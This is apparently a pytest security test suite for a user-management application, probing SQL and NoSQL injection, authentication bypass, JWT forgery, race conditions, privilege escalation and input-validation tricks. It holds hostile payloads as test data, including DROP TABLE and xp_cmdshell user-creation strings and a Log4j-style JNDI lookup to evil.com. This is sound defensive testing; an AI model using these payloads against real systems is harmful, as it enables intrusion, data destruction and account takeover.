"""
Comprehensive Security and Vulnerability Tests
Tests for SQL injection, XSS, CSRF, race conditions, data leaks, etc.
"""

import asyncio
import hashlib
import json
import secrets
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from typing import Any, Dict, List

import jwt
import pytest

from apps.user_management.config.settings import UserManagementConfig
from apps.user_management.main import UserManagementApp
from kailash.runtime.local import LocalRuntime


class TestSecurityVulnerabilities:
    """Comprehensive security testing for user management system"""

    @pytest.fixture
    async def app(self):
        """Create application instance"""
        app_manager = UserManagementApp()
        await app_manager.setup_database()
        return app_manager

    @pytest.fixture
    def runtime(self):
        """Create runtime instance"""
        return LocalRuntime()

    @pytest.fixture
    def config(self):
        """Get config instance"""
        return UserManagementConfig()

    @pytest.mark.asyncio
    async def test_sql_injection_attempts(self, app, runtime):
        """Test protection against SQL injection attacks"""

        # Common SQL injection payloads
        sql_injection_payloads = [
            "admin' OR '1'='1",
            "admin'; DROP TABLE users; --",
            "' OR 1=1 --",
            "admin' /*",
            "admin' UNION SELECT * FROM users --",
            "admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
            "'; EXEC xp_cmdshell('net user hack hack123 /add'); --",
            "admin' AND (SELECT COUNT(*) FROM users) > 0 --",
            '"; DROP TABLE users; --',
            "' OR '1'='1' /*",
            "admin' WAITFOR DELAY '00:00:05' --",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
        ]

        # Test registration with SQL injection attempts
        reg_workflow = app.user_api.create_user_registration_workflow()

        injection_blocked = 0
        for payload in sql_injection_payloads:
            try:
                result = await runtime.execute_async(
                    reg_workflow,
                    {
                        "email": f"{payload}@example.com",
                        "username": payload,
                        "password": "Test123!",
                    },
                )

                # Should either fail validation or be properly escaped
                if not result.get("success") or result.get("errors"):
                    injection_blocked += 1
                else:
                    # If it succeeded, verify the data was properly escaped
                    user = result.get("user", {})
                    assert (
                        user.get("username") == payload
                    )  # Should store literally, not execute
                    injection_blocked += 1

            except Exception:
                injection_blocked += 1

        # All SQL injection attempts should be blocked or escaped
        assert injection_blocked == len(sql_injection_payloads)

        # Test search with SQL injection
        search_workflow = app.search_api.create_user_search_workflow()

        for payload in sql_injection_payloads[:5]:  # Test subset
            try:
                result = await runtime.execute_async(
                    search_workflow,
                    {"user_id": "test123", "filters": {"query": payload}},
                )

                # Should not cause errors or expose data
                assert isinstance(result, dict)
                assert "error" not in str(result).lower() or not result.get("success")

            except Exception:
                # Exception is acceptable - means injection was blocked
                pass

    @pytest.mark.asyncio
    async def test_authentication_bypass_attempts(self, app, runtime):
        """Test protection against authentication bypass"""

        # Create legitimate user
        legitimate_user = {
            "email": "legitimate@example.com",
            "username": "legitimateuser",
            "password": "LegitPass123!",
        }

        reg_workflow = app.user_api.create_user_registration_workflow()
        reg_result = await runtime.execute_async(reg_workflow, legitimate_user)
        assert reg_result["success"] is True

        # Authentication bypass attempts
        bypass_attempts = [
            # Empty credentials
            {"email": "", "password": ""},
            {"email": "legitimate@example.com", "password": ""},
            {"email": "", "password": "LegitPass123!"},
            # Null byte injection
            {"email": "legitimate@example.com\x00", "password": "wrongpass"},
            {
                "email": "legitimate@example.com",
                "password": "wrongpass\x00LegitPass123!",
            },
            # Unicode tricks
            {
                "email": "legitimate@exａmple.com",
                "password": "LegitPass123!",
            },  # Unicode 'a'
            {
                "email": "LEGITIMATE@EXAMPLE.COM",
                "password": "LegitPass123!",
            },  # Case sensitivity
            # Type confusion
            {"email": ["legitimate@example.com"], "password": "LegitPass123!"},
            {"email": "legitimate@example.com", "password": ["LegitPass123!"]},
            {
                "email": {"$ne": None},
                "password": "LegitPass123!",
            },  # NoSQL injection attempt
            # Timing attacks
            {
                "email": "legitimate@example.com",
                "password": "a" * 1000,
            },  # Long password
            {"email": "a" * 1000 + "@example.com", "password": "pass"},  # Long email
        ]

        login_workflow = app.user_api.create_login_workflow()

        bypassed = 0
        for attempt in bypass_attempts:
            try:
                result = await runtime.execute_async(login_workflow, attempt)

                if result.get("success") and result.get("tokens"):
                    # Should not succeed with invalid credentials
                    bypassed += 1

            except Exception:
                # Exception is good - means bypass was prevented
                pass

        assert bypassed == 0  # No bypass attempts should succeed

    @pytest.mark.asyncio
    async def test_jwt_token_vulnerabilities(self, app, runtime, config):
        """Test JWT token security"""

        # Create test user
        user_data = {
            "email": "jwttest@example.com",
            "username": "jwtuser",
            "password": "JWTPass123!",
        }

        reg_workflow = app.user_api.create_user_registration_workflow()
        reg_result = await runtime.execute_async(reg_workflow, user_data)
        valid_token = reg_result["tokens"]["access"]

        # 1. Test algorithm confusion attack
        try:
            # Decode token to get payload
            unverified = jwt.decode(valid_token, options={"verify_signature": False})

            # Try to create token with 'none' algorithm
            none_token = jwt.encode(unverified, "", algorithm="none")

            # This should fail verification
            with pytest.raises(jwt.InvalidTokenError):
                jwt.decode(
                    none_token, config.JWT_SECRET_KEY, algorithms=[config.JWT_ALGORITHM]
                )

        except Exception:
            pass  # Good - attack prevented

        # 2. Test weak secret key
        weak_secrets = ["secret", "123456", "password", "jwt_secret", ""]

        for weak_secret in weak_secrets:
            try:
                # Should not be able to decode with weak secrets
                jwt.decode(valid_token, weak_secret, algorithms=[config.JWT_ALGORITHM])
                assert False, f"Token decoded with weak secret: {weak_secret}"
            except jwt.InvalidSignatureError:
                pass  # Good - weak secret rejected

        # 3. Test token tampering
        try:
            # Decode and modify payload
            unverified = jwt.decode(valid_token, options={"verify_signature": False})
            unverified["user_id"] = "admin"  # Try to escalate privileges
            unverified["is_superuser"] = True

            # Re-encode with wrong secret
            tampered_token = jwt.encode(
                unverified, "wrong_secret", algorithm=config.JWT_ALGORITHM
            )

            # Should fail verification
            with pytest.raises(jwt.InvalidSignatureError):
                jwt.decode(
                    tampered_token,
                    config.JWT_SECRET_KEY,
                    algorithms=[config.JWT_ALGORITHM],
                )

        except Exception:
            pass  # Good - tampering detected

        # 4. Test expired token
        expired_payload = {
            "user_id": "test123",
            "exp": datetime.utcnow() - timedelta(hours=1),  # Expired 1 hour ago
        }

        expired_token = jwt.encode(
            expired_payload, config.JWT_SECRET_KEY, algorithm=config.JWT_ALGORITHM
        )

        with pytest.raises(jwt.ExpiredSignatureError):
            jwt.decode(
                expired_token, config.JWT_SECRET_KEY, algorithms=[config.JWT_ALGORITHM]
            )

        # 5. Test token with future iat (issued at time)
        future_payload = {
            "user_id": "test123",
            "iat": datetime.utcnow() + timedelta(hours=1),  # Future issue time
            "exp": datetime.utcnow() + timedelta(hours=2),
        }

        future_token = jwt.encode(
            future_payload, config.JWT_SECRET_KEY, algorithm=config.JWT_ALGORITHM
        )

        # Should handle future tokens appropriately
        try:
            decoded = jwt.decode(
                future_token, config.JWT_SECRET_KEY, algorithms=[config.JWT_ALGORITHM]
            )
            # If decoded, system should validate iat
        except jwt.InvalidIssuedAtError:
            pass  # Good - future token rejected

    @pytest.mark.asyncio
    async def test_race_condition_vulnerabilities(self, app, runtime):
        """Test for race condition vulnerabilities"""

        # 1. Test concurrent user registration (same email)
        email = "racetest@example.com"

        async def register_user(index):
            reg_workflow = app.user_api.create_user_registration_workflow()
            return await runtime.execute_async(
                reg_workflow,
                {
                    "email": email,
                    "username": f"raceuser{index}",
                    "password": "RacePass123!",
                },
            )

        # Launch 10 concurrent registrations with same email
        tasks = [register_user(i) for i in range(10)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Only one should succeed
        successful = sum(1 for r in results if isinstance(r, dict) and r.get("success"))
        assert successful <= 1  # At most one should succeed

        # 2. Test concurrent permission modifications
        # Create test role
        role_workflow = app.role_api.create_role_management_workflow()
        await runtime.execute_async(
            role_workflow,
            {
                "user_id": "admin",
                "action": "create",
                "operation": "create_role",
                "role_data": {"name": "race_test_role", "permissions": ["read:data"]},
            },
        )

        # Concurrent permission updates
        async def update_permissions(action, permissions):
            perm_workflow = app.role_api.create_permission_assignment_workflow()
            return await runtime.execute_async(
                perm_workflow,
                {
                    "admin_id": "admin",
                    "role_name": "race_test_role",
                    "permissions": permissions,
                    "action": action,
                },
            )

        # Launch competing updates
        perm_tasks = []
        perm_tasks.append(update_permissions("add", ["write:data", "delete:data"]))
        perm_tasks.append(update_permissions("remove", ["read:data"]))
        perm_tasks.append(update_permissions("add", ["admin:all"]))

        perm_results = await asyncio.gather(*perm_tasks, return_exceptions=True)

        # Should handle concurrent updates without corruption
        # Final state should be consistent

        # 3. Test balance/credit race conditions (if applicable)
        # Create user with credits/balance
        test_user_id = "balance_test_user"

        async def modify_balance(amount):
            """Simulate balance modification"""
            # In a real system, this would modify user credits/balance
            return {"success": True, "amount": amount}

        # Concurrent balance modifications
        balance_tasks = []
        for i in range(20):
            amount = 10 if i % 2 == 0 else -10
            balance_tasks.append(modify_balance(amount))

        balance_results = await asyncio.gather(*balance_tasks, return_exceptions=True)

        # Final balance should be consistent (net zero in this case)
        # In real implementation, verify atomic updates

    @pytest.mark.asyncio
    async def test_privilege_escalation_attempts(self, app, runtime):
        """Test protection against privilege escalation"""

        # Create regular user
        regular_user_data = {
            "email": "regular@example.com",
            "username": "regularuser",
            "password": "RegularPass123!",
        }

        reg_workflow = app.user_api.create_user_registration_workflow()
        reg_result = await runtime.execute_async(reg_workflow, regular_user_data)
        regular_user_id = reg_result["user"]["id"]

        # 1. Try to assign admin role to self
        role_workflow = app.role_api.create_role_management_workflow()

        escalation_result = await runtime.execute_async(
            role_workflow,
            {
                "user_id": regular_user_id,  # Regular user trying to escalate
                "action": "manage",
                "operation": "assign_role_to_user",
                "data": {"user_id": regular_user_id, "role_name": "admin"},
            },
        )

        # Should be denied
        assert not escalation_result.get("success") or not escalation_result.get(
            "allowed"
        )

        # 2. Try to modify another user's profile
        profile_workflow = app.user_api.create_profile_update_workflow()

        modify_result = await runtime.execute_async(
            profile_workflow,
            {
                "user_id": "other_user_id",  # Trying to modify another user
                "updates": {"is_admin": True},
            },
        )

        # Should be denied or limited to safe fields
        assert not modify_result.get("success") or "is_admin" not in modify_result.get(
            "updates", {}
        )

        # 3. Try to access admin endpoints
        perm_node = runtime.create_node(
            "PermissionCheckNode", app.config.NODE_CONFIGS["PermissionCheckNode"]
        )

        admin_check = await runtime.execute_node_async(
            perm_node,
            {"user_id": regular_user_id, "resource": "admin", "action": "manage"},
        )

        assert not admin_check["allowed"]

        # 4. Try to bypass field-level permissions
        # Attempt to update restricted fields through bulk update
        bulk_workflow = app.bulk_api.create_bulk_update_workflow()

        bulk_escalation = await runtime.execute_async(
            bulk_workflow,
            {
                "user_id": regular_user_id,
                "updates": [
                    {
                        "user_ids": [regular_user_id],
                        "changes": {
                            "is_superuser": True,
                            "is_staff": True,
                            "role": "admin",
                        },
                    }
                ],
            },
        )

        # Should be denied or filtered
        assert not bulk_escalation.get("success") or not bulk_escalation.get("allowed")

    @pytest.mark.asyncio
    async def test_data_exposure_vulnerabilities(self, app, runtime):
        """Test for information disclosure vulnerabilities"""

        # Create users with sensitive data
        users_data = [
            {
                "email": "ceo@company.com",
                "username": "ceo",
                "password": "CEOPass123!",
                "salary": 500000,
                "ssn": "123-45-6789",
            },
            {
                "email": "employee@company.com",
                "username": "employee",
                "password": "EmpPass123!",
                "salary": 50000,
                "ssn": "987-65-4321",
            },
        ]

        reg_workflow = app.user_api.create_user_registration_workflow()

        created_users = []
        for user_data in users_data:
            result = await runtime.execute_async(reg_workflow, user_data)
            created_users.append(result["user"]["id"])

        # 1. Test enumeration through error messages
        login_workflow = app.user_api.create_login_workflow()

        # Try with valid email, wrong password
        login_result1 = await runtime.execute_async(
            login_workflow, {"email": "ceo@company.com", "password": "wrongpass"}
        )

        # Try with invalid email
        login_result2 = await runtime.execute_async(
            login_workflow,
            {"email": "nonexistent@company.com", "password": "wrongpass"},
        )

        # Error messages should not reveal whether email exists
        if not login_result1.get("success") and not login_result2.get("success"):
            error1 = login_result1.get("error", "")
            error2 = login_result2.get("error", "")
            # Errors should be generic, not revealing user existence
            assert error1 == error2 or (
                "invalid credentials" in error1.lower()
                and "invalid credentials" in error2.lower()
            )

        # 2. Test information leakage through search
        search_workflow = app.search_api.create_user_search_workflow()

        # Employee searching for CEO data
        search_result = await runtime.execute_async(
            search_workflow,
            {"user_id": created_users[1], "filters": {"query": "ceo"}},  # Employee
        )

        # Should not expose sensitive fields
        if search_result.get("success") and search_result.get("data"):
            for user in search_result["data"]:
                assert "password" not in user
                assert "password_hash" not in user
                assert "ssn" not in user
                assert "salary" not in user

        # 3. Test API response filtering
        user_node = runtime.create_node(
            "UserManagementNode", app.config.NODE_CONFIGS["UserManagementNode"]
        )

        # Get another user's data
        other_user_result = await runtime.execute_node_async(
            user_node,
            {
                "operation": "get_user",
                "user_id": created_users[0],  # CEO
                "requester_id": created_users[1],  # Employee requesting
            },
        )

        # Should filter sensitive fields based on permissions
        if other_user_result.get("user"):
            user = other_user_result["user"]
            assert "password_hash" not in user
            assert "ssn" not in user
            # Salary might be filtered based on permissions

        # 4. Test error stack trace exposure
        # Try to trigger errors and check responses
        try:
            # Intentionally malformed request
            await runtime.execute_async(
                search_workflow,
                {
                    "user_id": "invalid_id_format_!@#$%",
                    "filters": None,  # Should be dict
                },
            )
        except Exception as e:
            # Error should not expose internal details
            error_str = str(e)
            assert "traceback" not in error_str.lower()
            assert "stack" not in error_str.lower()
            assert "/Users/" not in error_str  # No file paths
            assert "line" not in error_str.lower()

    @pytest.mark.asyncio
    async def test_session_security(self, app, runtime):
        """Test session management security"""

        # Create test user
        user_data = {
            "email": "sessiontest@example.com",
            "username": "sessionuser",
            "password": "SessionPass123!",
        }

        reg_workflow = app.user_api.create_user_registration_workflow()
        reg_result = await runtime.execute_async(reg_workflow, user_data)
        user_id = reg_result["user"]["id"]

        # 1. Test session fixation
        # Login to get session
        login_workflow = app.user_api.create_login_workflow()
        login_result = await runtime.execute_async(
            login_workflow,
            {"email": user_data["email"], "password": user_data["password"]},
        )

        session_id_1 = login_result["session"]["id"]

        # Login again - should get new session ID
        login_result2 = await runtime.execute_async(
            login_workflow,
            {"email": user_data["email"], "password": user_data["password"]},
        )

        session_id_2 = login_result2["session"]["id"]

        # Session IDs should be different (regenerated on login)
        assert session_id_1 != session_id_2

        # 2. Test concurrent session limits
        sessions = []
        max_sessions = app.config.MAX_SESSIONS_PER_USER

        # Create max sessions + 1
        for i in range(max_sessions + 1):
            result = await runtime.execute_async(
                login_workflow,
                {"email": user_data["email"], "password": user_data["password"]},
            )
            if result.get("success"):
                sessions.append(result["session"]["id"])

        # Should limit concurrent sessions
        assert len(sessions) <= max_sessions

        # 3. Test session timeout
        session_mgmt_workflow = app.auth_workflows.create_session_management_workflow()

        # Create expired token
        expired_token = jwt.encode(
            {
                "user_id": user_id,
                "session_id": "expired_session",
                "exp": datetime.utcnow() - timedelta(hours=1),
            },
            app.config.JWT_SECRET_KEY,
            algorithm=app.config.JWT_ALGORITHM,
        )

        # Try to use expired session
        expired_result = await runtime.execute_async(
            session_mgmt_workflow, {"access_token": expired_token}
        )

        assert not expired_result.get("success")

        # 4. Test session hijacking protection
        # Simulate token theft - using token from different IP
        # This would be implemented in middleware with IP checking

        # 5. Test logout effectiveness
        # After logout, token should be invalidated
        # This requires token blacklisting or session store

    @pytest.mark.asyncio
    async def test_input_validation_bypasses(self, app, runtime):
        """Test for input validation bypass techniques"""

        reg_workflow = app.user_api.create_user_registration_workflow()

        # 1. Unicode normalization attacks
        unicode_attempts = [
            {
                "email": "admin＠example.com",  # Full-width @
                "username": "ａdmin",  # Full-width 'a'
                "password": "Pass１２３!",  # Full-width numbers
            },
            {
                "email": "admin@еxample.com",  # Cyrillic 'е'
                "username": "аdmin",  # Cyrillic 'а'
                "password": "Password123!",
            },
        ]

        for attempt in unicode_attempts:
            result = await runtime.execute_async(reg_workflow, attempt)
            # Should either normalize or reject

        # 2. Null character injection
        null_attempts = [
            {
                "email": "test\x00@example.com",
                "username": "test\x00user",
                "password": "Pass\x00word123!",
            },
            {
                "email": "test@example.com\x00.evil.com",
                "username": "testuser",
                "password": "Password123!",
            },
        ]

        for attempt in null_attempts:
            result = await runtime.execute_async(reg_workflow, attempt)
            # Should strip or reject null bytes
            if result.get("success"):
                assert "\x00" not in result["user"]["email"]
                assert "\x00" not in result["user"]["username"]

        # 3. Length limit bypasses
        # Very long inputs
        long_email = "a" * 1000 + "@example.com"
        long_username = "a" * 1000
        long_password = "a" * 1000 + "Pass123!"

        long_result = await runtime.execute_async(
            reg_workflow,
            {"email": long_email, "username": long_username, "password": long_password},
        )

        # Should enforce length limits
        if long_result.get("success"):
            assert len(long_result["user"]["username"]) <= 150  # Reasonable limit
            assert len(long_result["user"]["email"]) <= 254  # RFC limit

        # 4. Type confusion
        type_attempts = [
            {
                "email": ["test@example.com"],  # Array instead of string
                "username": {"value": "testuser"},  # Object instead of string
                "password": 123456,  # Number instead of string
            },
            {
                "email": True,  # Boolean
                "username": None,  # Null
                "password": {"$ne": None},  # NoSQL injection attempt
            },
        ]

        for attempt in type_attempts:
            try:
                result = await runtime.execute_async(reg_workflow, attempt)
                # Should handle type errors gracefully
            except Exception:
                pass  # Expected - type validation

        # 5. Format string attacks
        format_attempts = [
            {
                "email": "%s%s%s%s@example.com",
                "username": "user%n%n%n",
                "password": "Pass%x%x123!",
            },
            {
                "email": "${jndi:ldap://evil.com/a}@example.com",  # Log4j style
                "username": "{{7*7}}",  # Template injection
                "password": "Password123!",
            },
        ]

        for attempt in format_attempts:
            result = await runtime.execute_async(reg_workflow, attempt)
            # Should treat as literal strings, not execute
            if result.get("success"):
                assert (
                    result["user"]["username"] == attempt["username"]
                )  # Stored literally
